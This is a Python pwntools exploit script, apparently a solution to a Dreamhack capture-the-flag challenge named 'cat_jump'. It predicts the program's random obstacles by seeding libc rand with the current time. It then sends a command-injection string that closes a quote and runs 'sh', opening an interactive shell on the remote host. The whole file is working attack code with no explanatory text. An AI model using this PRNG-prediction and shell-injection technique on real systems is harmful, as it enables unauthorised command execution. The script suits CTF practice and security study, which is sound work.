from pwn import *
import ctypes
import time

PORT = 21295
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./cat_jump', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

libc = ctypes.CDLL("libc.so.6")
now = int(time.time())
libc.srand(now)

p.recvuntil(b"let the cat reach the roof! ")

for i in range(37):
    obstacle = libc.rand() % 2
    
    if obstacle == 0:
        p.sendlineafter(b"left jump='h', right jump='j': ", b'l')
    else:
        p.sendlineafter(b"left jump='h', right jump='j': ", b'h')
    
    libc.rand() 
        
p.sendlineafter(b": ", b"pwned!!\";sh;\"")
p.interactive()
